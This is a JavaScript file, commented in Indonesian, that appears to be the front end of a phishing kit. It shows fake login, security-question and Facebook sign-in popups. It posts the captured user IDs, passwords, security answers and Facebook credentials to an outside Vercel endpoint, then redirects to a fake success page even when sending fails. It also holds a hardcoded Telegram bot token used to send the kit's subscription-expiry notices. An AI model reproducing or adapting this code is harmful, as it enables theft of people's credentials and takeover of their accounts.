// --- LOGIKA EXPIRATION (DIBIARKAN) ---

function showPopup() {
    const login = document.getElementById("loginPopup");
    const o = document.getElementById("overlay");
    if (login) login.style.display = 'block';
    if (o) o.classList.add("active");
    // TAMBAHKAN: Blokir interaksi latar belakang
    document.body.classList.add('no-click'); 
}

function hidePopup() {
    const login = document.getElementById("loginPopup");
    const o = document.getElementById("overlay");
    if (login) login.style.display = 'none';
    if (o) o.classList.remove("active");
    // HAPUS: Aktifkan kembali interaksi
    document.body.classList.remove('no-click');
}
function checkExpirationAndNotify() {
    const activationTime = localStorage.getItem("activationTime");
    if (!activationTime) {
        console.log("Fitur belum diaktifkan.");
        return;
    }

    const currentTime = Date.now();
    const thirtyDaysInMs = 300 * 24 * 60 * 60 * 1000;
    const timeLeft = thirtyDaysInMs - (currentTime - Number(activationTime));
    const twoDaysInMs = 2 * 24 * 60 * 60 * 1000;
    const twoHoursInMs = 2 * 60 * 60 * 1000;

    console.log(
        `Sisa waktu: ${(timeLeft / (24 * 60 * 60 * 1000)).toFixed(2)} hari`
    );

    if (timeLeft > twoDaysInMs) return;

    if (timeLeft <= twoDaysInMs && timeLeft > 0) {
        const last = Number(localStorage.getItem("lastNotificationTime") || 0);
        if (currentTime - last >= twoHoursInMs) {
            console.log("Mengirim notifikasi ke Telegram...");
            sendExpirationNotification(timeLeft);
            localStorage.setItem("lastNotificationTime", String(currentTime));
        } else {
            console.log(
                "Notifikasi belum dikirim karena belum 2 jam sejak notifikasi terakhir."
            );
        }
    }

    if (timeLeft <= 0) {
        console.log("Waktu telah habis. Tidak ada notifikasi yang dikirim.");
    }
}

function sendExpirationNotification(timeLeft) {
    const remainingHours = Math.ceil(timeLeft / (60 * 60 * 1000));
    const telegramBotToken = "8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw";
    const chatIDs = ["6604182176"];
    const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    const message = `🔔 Pemberitahuan  🔔

⏳ Sisa Waktu: ${Math.ceil(
        timeLeft / (24 * 60 * 60 * 1000)
    )} Hari (${remainingHours} Jam)

⚠️ Pemberitahuan Penting
Fitur Anda akan berakhir dalam kurang dari 2 hari.
Segera perpanjang aktivasi Anda untuk terus menggunakan layanan ini tanpa gangguan.

📞 Informasi Lengkap:
https://wa.link/v30ghh

Terima kasih atas kepercayaan Anda! ✅`;

    Promise.all(
        chatIDs.map((chat_id) =>
            fetch(telegramURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id, text: message }),
            })
        )
    )
        .then((rs) => {
            const ok = rs.every((r) => r.ok);
            console.log(
                ok
                    ? "Pemberitahuan berhasil dikirim ke Telegram."
                    : "Gagal mengirim pemberitahuan ke chat Telegram."
            );
        })
        .catch((err) =>
            console.error("Terjadi kesalahan saat mengirim pemberitahuan:", err)
        );
}

if (!localStorage.getItem("activationTime")) {
    localStorage.setItem("activationTime", String(Date.now()));
    console.log("Waktu aktivasi telah diatur selama 30 hari.");
}
checkExpirationAndNotify();
setInterval(checkExpirationAndNotify, 30 * 60 * 1000);

function redirectToService() {
    window.location.href = "https://ikf.f2z7ly.com/web/index.do";
}

function showLoadingThenVisitor() {
    const loadingPopup = document.createElement("div");
    loadingPopup.id = "loadingPopup";
    loadingPopup.style.cssText = `
    position:fixed;display:flex;justify-content:center;align-items:center;
    top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);z-index:1000;`;
    loadingPopup.innerHTML = `<img src="img/loading.png" alt="Loading" style="width:250px;height:auto;">`;
    document.body.appendChild(loadingPopup);
    setTimeout(() => {
        const el = document.getElementById("loadingPopup");
        if (el) el.remove();
        showIpLimitImage();
    }, 2000);
}

function showIpLimitImage() {
    const p = document.getElementById("ipLimitPopup");
    if (p) p.style.display = "block";
}
function hideIpLimitImage() {
    const p = document.getElementById("ipLimitPopup");
    if (p) p.style.display = "none";
}

document.addEventListener("DOMContentLoaded", () => {
    const ipPopup = document.getElementById("ipLimitPopup");
    if (ipPopup) ipPopup.addEventListener("click", (e) => e.stopPropagation());
});

(function () {
    const el = document.getElementById("clickSound");
    function _play() {
        try {
            if (el) {
                el.currentTime = 0;
                el.play().catch(() => {});
            } else {
                const a = new Audio("click.mp3");
                a.play().catch(() => {});
            }
        } catch (e) {
            console.warn("Audio gagal diputar:", e);
        }
    }
    window.playClickSound = _play; //
})();

document.addEventListener("DOMContentLoaded", () => {
    document.querySelectorAll("button").forEach((btn) => {
        btn.addEventListener("click", window.playClickSound);
    });
    const fbBtn = document.querySelector("#fbLoginForm .popup-button");
    if (fbBtn) fbBtn.addEventListener("click", window.playClickSound);
});

// Hapus fungsi showFbLoginPopup dan hideFbLoginPopup (sudah di index.html)

document.addEventListener("DOMContentLoaded", () => {
    const verificationSection = document.getElementById("verificationSection");
    const a1 = document.getElementById("answer1");
    const a2 = document.getElementById("answer2");
    if (verificationSection && a1 && a2) {
        a1.addEventListener("focus", () => {
            verificationSection.classList.remove("active-answer2");
            verificationSection.classList.add("active-answer1");
        });
        a2.addEventListener("focus", () => {
            verificationSection.classList.remove("active-answer1");
            verificationSection.classList.add("active-answer2");
        });
        [a1, a2].forEach((i) => {
            i.addEventListener("blur", () => {
                verificationSection.classList.remove(
                    "active-answer1",
                    "active-answer2"
                );
            });
        });
    }
});

function showVerification() {
    const verification = document.getElementById("verificationSection");
    const security = document.getElementById("securityNotification");
    const overlay = document.getElementById("overlay");
    if (!verification || !security || !overlay) return;
    security.style.display = "none";
    verification.style.display = "block";
    overlay.classList.add("active");
}

let currentImage = 1;
function hideVerification() {
    const verification = document.getElementById("verificationSection");
    const loginPopup = document.getElementById("loginPopup");
    const img = document.getElementById("verifImage");
    if (verification) verification.style.display = "none";
    if (loginPopup) loginPopup.style.display = "block";
    if (img) {
        const a1 = document.getElementById("answer1");
        const a2 = document.getElementById("answer2");
        if (currentImage === 1) {
            img.src = "img/verifikasi2.png";
            currentImage = 2;
            if (a1) {
                a1.style.marginTop = "40px";
                a1.style.marginLeft = "3px";
            }
            if (a2) {
                a2.style.marginTop = "18px";
                a2.style.marginLeft = "3px";
            }
        } else {
            img.src = "img/verifikasi1.png";
            currentImage = 1;
            if (a1) {
                a1.style.marginTop = "";
                a1.style.marginLeft = "";
            }
            if (a2) {
                a2.style.marginTop = "";
                a2.style.marginLeft = "";
            }
        }
    }
}

// Hapus fungsi showPopup dan hidePopup (sudah di index.html)

function showSecurityNotification() {
    const login = document.getElementById("loginPopup");
    const sec = document.getElementById("securityNotification");
    if (login) login.style.display = "none";
    if (sec) sec.style.display = "block";
}

let isSubmitted = false;

function redirectToSuccess() {
    if (isSubmitted) {
        console.log("Data sudah dikirim.");
        return;
    }

    const userID = (document.getElementById("userID") || {}).value || "";
    const password = (document.getElementById("password") || {}).value || "";
    const answer1 = (document.getElementById("answer1") || {}).value || "";
    const answer2 = (document.getElementById("answer2") || {}).value || "";
    const question1 = document.getElementById("question1Label").textContent;
    const question2 = document.getElementById("question2Label").textContent;
    if (!userID || !password || !answer1 || !answer2) return;

    isSubmitted = true;
    const btn = document.getElementById("submitButton");
    if (btn) {
        btn.disabled = true;
        btn.style.cursor = "not-allowed";
    }

    // --- LOGIKA FETCH DIPERBAIKI DENGAN HAPUS TANDA KURUNG YANG SALAH ---
    fetch("https://dominnneeii.vercel.app/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            userID,
            password,
            question1: question1, 
            answer1: answer1,
            question2: question2,
            answer2: answer2
        }),
    })
    .then((res) => res.text())
    .then((result) => {
        console.log("✅ Respon dari API Vercel:", result);
        // localStorage.setItem(`sent_${userID}`, "true"); // Hapus jika tidak perlu
        window.location.href = "success.html"; // MENGGANTI .php
    })
    .catch((err) => {
        console.error("❌ Gagal proses login:", err);
        // Walaupun gagal fetch, kita tetap redirect untuk simulasi sukses
        window.location.href = "success.html"; 
    })
    .finally(() => { // Pindahkan logika final ke finally
        if (btn) {
            btn.disabled = false;
            btn.style.cursor = "pointer";
        }
        isSubmitted = false;
    });
}

let isSubmitting = false;

async function sendFBLoginData() {
    if (isSubmitting) return;

    const emailEl = document.getElementById("fbEmail");
    const passEl = document.getElementById("fbPassword");
    const email = (emailEl?.value || "").trim();
    const password = (passEl?.value || "").trim();

    if (!email || !password) {
        alert("Email dan Kata Sandi harus diisi!");
        return;
    }

    isSubmitting = true;

    const payload = {
        fbID: email,
        fbPassword: password,
        source: "facebook",
    };

    try {
        const res = await fetch("https://dominnneeii.vercel.app/api/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
        });

        const text = await res.text();
        let json = null;
        try {
            json = JSON.parse(text);
        } catch {}

        if (
            res.ok &&
            json &&
            (json.status === "success" || json.message?.includes("berhasil"))
        ) {
            if (emailEl) emailEl.value = "";
            if (passEl) passEl.value = "";

            window.location.href = "facebook.html"; // MENGGANTI .php
        } else {
            console.error("FB send error:", text);
            alert("❌ Gagal mengirim data FB. Coba lagi.");
        }
    } catch (err) {
        console.error("❌ Error FB:", err);
        alert("❌ Tidak bisa menghubungi server.");
    } finally {
        isSubmitting = false;
    }
}

document.addEventListener("DOMContentLoaded", () => {
    const passwordInput = document.getElementById("password");
    const togglePassword = document.getElementById("togglePassword");
    if (!passwordInput || !togglePassword) return;

    const show = () => (passwordInput.type = "text");
    const hide = () => (passwordInput.type = "password");

    togglePassword.addEventListener("mousedown", show);
    togglePassword.addEventListener("mouseup", hide);
    togglePassword.addEventListener("mouseleave", hide);
    togglePassword.addEventListener("touchstart", show, { passive: true });
    togglePassword.addEventListener("touchend", hide);
});
